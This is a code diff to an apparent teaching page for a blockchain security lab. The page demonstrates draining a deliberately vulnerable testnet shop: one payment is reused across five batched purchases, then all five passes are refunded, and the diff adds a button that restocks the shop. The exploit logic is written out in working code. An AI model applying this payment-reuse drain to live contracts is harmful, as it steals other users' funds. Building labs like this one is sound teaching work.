@@ -11,6 +11,8 @@ import { friendly } from "@/lib/errors";
 import { eth } from "@/lib/format";
 
 const ENTRIES = 5;
+/** What each lab contract holds from 9 honest 0.001 ETH purchases. */
+const HONEST = 9_000_000_000_000_000n;
 
 type Side = { name: string; address?: Address; abi: Abi; balance: bigint; minted: bigint; price: bigint };
 type Result = { ok: boolean; lines: string[]; hashes: Hex[] };
@@ -40,20 +42,61 @@ export default function Lab() {
 
   const batch = (abi: Abi) => encodeFunctionData({ abi, functionName: "multicall", args: [Array.from({ length: ENTRIES }, () => encodeFunctionData({ abi, functionName: "buy", args: [0n, 1n] }))] });
 
+  // Restock NaiveShop with one honest purchase (value == price * qty) until it
+  // holds `target`. On a shared testnet every attack drains 0.004 ETH, so this
+  // keeps the lab runnable for the next visitor.
+  const restock = async (side: Side, target: bigint): Promise<{ hash: Hex; qty: bigint } | null> => {
+    if (!side.address || side.balance >= target) return null;
+    const qty = (target - side.balance + side.price - 1n) / side.price;
+    const hash = await w.write(`Restock NaiveShop: ${qty} honest purchase${qty === 1n ? "" : "s"}`, {
+      address: side.address,
+      abi: naiveAbi,
+      functionName: "buy",
+      args: [0n, qty],
+      value: side.price * qty,
+    });
+    return hash ? { hash, qty } : null;
+  };
+
   const attackNaive = async () => {
     if (!naive?.address) return;
     setBusy("naive");
-    const before = naive.balance;
-    const first = naive.minted + 1n;
-    const lines = [`Pay ${eth(naive.price)} ETH once, batch ${ENTRIES} buys of ${eth(naive.price)} ETH`];
-    const h1 = await w.write("Attack: batched buys", { address: naive.address, abi: naiveAbi, functionName: "multicall", args: [(decodeArgs(batch(naiveAbi)))], value: naive.price });
+    const lines: string[] = [];
+    const hashes: Hex[] = [];
+    // The refunds need (ENTRIES - 1) prices on top of Mallory's one payment.
+    let side = naive;
+    if (side.balance < side.price * BigInt(ENTRIES - 1)) {
+      const r = await restock(side, HONEST);
+      if (!r) return setBusy(null);
+      lines.push(`Earlier visitors had drained the shop, so an honest buyer restocked it first (${r.qty} purchases).`);
+      hashes.push(r.hash);
+      side = await sideState("NaiveShop", naive.address, naiveAbi, true);
+    }
+    const before = side.balance;
+    const first = side.minted + 1n;
+    lines.push(`Pay ${eth(side.price)} ETH once, batch ${ENTRIES} buys of ${eth(side.price)} ETH`);
+    const h1 = await w.write("Attack: batched buys", { address: side.address!, abi: naiveAbi, functionName: "multicall", args: [(decodeArgs(batch(naiveAbi)))], value: side.price });
     if (!h1) return setBusy(null);
     const refunds = Array.from({ length: ENTRIES }, (_, i) => encodeFunctionData({ abi: naiveAbi, functionName: "refund", args: [first + BigInt(i)] }));
-    const h2 = await w.write(`Attack: refund ${ENTRIES} passes`, { address: naive.address, abi: naiveAbi, functionName: "multicall", args: [refunds] });
-    const after = await publicClient.getBalance({ address: naive.address });
+    const h2 = await w.write(`Attack: refund ${ENTRIES} passes`, { address: side.address!, abi: naiveAbi, functionName: "multicall", args: [refunds] });
+    const after = await publicClient.getBalance({ address: side.address! });
     lines.push(`Got ${ENTRIES} passes for one payment, refunded all ${ENTRIES}.`);
     lines.push(`Shop balance ${eth(before)} → ${eth(after)} ETH: ${eth(before - after)} ETH of other buyers' money is now yours.`);
-    setRes((r) => ({ ...r, naive: { ok: !!h2, lines, hashes: [h1, ...(h2 ? [h2] : [])] } }));
+    setRes((r) => ({ ...r, naive: { ok: !!h2, lines, hashes: [...hashes, h1, ...(h2 ? [h2] : [])] } }));
+    setBusy(null);
+    void reload();
+  };
+
+  const putBack = async () => {
+    if (!naive?.address) return;
+    setBusy("naive-restock");
+    const r = await restock(naive, HONEST);
+    if (r) {
+      setRes((x) => ({
+        ...x,
+        naive: { ok: true, lines: [...(x.naive?.lines ?? []), `Put it back: ${r.qty} honest purchases refilled the shop to ${eth(HONEST)} ETH for the next visitor.`], hashes: [...(x.naive?.hashes ?? []), r.hash] },
+      }));
+    }
     setBusy(null);
     void reload();
   };
@@ -91,7 +134,6 @@ export default function Lab() {
 
   if (!DEPLOYMENT.naiveShop || !DEPLOYMENT.labShop) return <p className="card">The lab contracts are not deployed on this network.</p>;
 
-  const HONEST = 9_000_000_000_000_000n;
   return (
     <Page className="space-y-8">
       <section className="grain relative overflow-hidden rounded-[1.8rem] bg-ink p-6 text-paper sm:p-9">
@@ -139,7 +181,7 @@ export default function Lab() {
                   <span className="num font-semibold"><Flip k={side?.minted.toString() ?? "-"}>{side?.minted.toString() ?? "…"}</Flip></span>
                 </div>
               </div>
-              <motion.button whileTap={{ scale: 0.97 }} data-testid={`attack-${key}`} className={`${key === "naive" ? "btn-danger" : "btn-primary"} mt-5 w-full`} disabled={!!busy} onClick={() => void run()}>
+              <motion.button whileTap={{ scale: 0.97 }} data-testid={`attack-${key}`} className={`${key === "naive" ? "btn-danger" : "btn-primary"} mt-5 w-full`} disabled={!!busy || !side?.address || (key === "till" && !w.address)} onClick={() => void run()}>
                 {busy === key ? (
                   <><span className="h-4 w-4 animate-spin rounded-full border-2 border-current border-t-transparent motion-reduce:animate-none" /> Running…</>
                 ) : (
@@ -171,6 +213,11 @@ export default function Lab() {
                   </motion.div>
                 )}
               </AnimatePresence>
+              {key === "naive" && r?.ok && side && side.balance < HONEST && (
+                <button data-testid="restock-naive" className="btn-ghost mt-3 w-full text-sm" disabled={!!busy} onClick={() => void putBack()}>
+                  {busy === "naive-restock" ? "Putting it back…" : `Put ${eth(HONEST - side.balance)} ETH back for the next visitor`}
+                </button>
+              )}
               {key === "till" && r && !r.hashes.length && (
                 <button className="btn-ghost mt-3 w-full text-sm" disabled={!!busy} onClick={() => void sendAnyway()}>Send it on-chain anyway (to see the reverted tx)</button>
               )}
